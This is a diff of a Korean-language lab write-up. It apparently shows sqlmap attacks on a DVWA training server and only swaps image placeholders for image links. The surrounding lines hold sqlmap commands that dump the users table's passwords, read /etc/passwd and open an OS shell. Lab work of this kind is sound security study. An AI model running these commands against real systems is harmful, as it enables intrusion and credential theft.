@@ -39,14 +39,14 @@ Target 서버 `192.9.200.11`의 DVWA SQL Injection 페이지를 대상으로 데
 ```bash
 sqlmap -u "http://192.9.200.11/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=..." --dbs
 ```
-[여기에 데이터베이스 목록이 출력된 결과 이미지 삽입]
+   ![SqlmapDbs](/assets/images/Sql_1.png)
 
 #### **`users` 테이블 데이터 탈취**
 위에서 확인한 `dvwa` 데이터베이스의 `users` 테이블에서 `user`, `password` 컬럼의 내용을 탈취한다.
 ```bash
 sqlmap -u "..." --cookie="..." -D dvwa -T users -C user,password --dump
 ```
-[여기에 users 테이블의 내용이 출력된 결과 이미지 삽입]
+   ![SqlmapDump](/assets/images/Sql_2.png)
 
 ---
 
@@ -65,7 +65,7 @@ sqlmap -u "..." --cookie="..." --file-read "/etc/passwd" --batch
 ```bash
 sqlmap -u "..." --cookie="..." --os-shell
 ```
-[여기에 --os-shell 획득 이미지 삽입]
+   ![SqlmapOshell](/assets/images/Sql_3.png)
 
 `os-shell` 세션에 성공적으로 진입하면 `whoami`, `ls -l` 등 원하는 시스템 명령어를 실행하여 서버를 직접 제어할 수 있다.
 
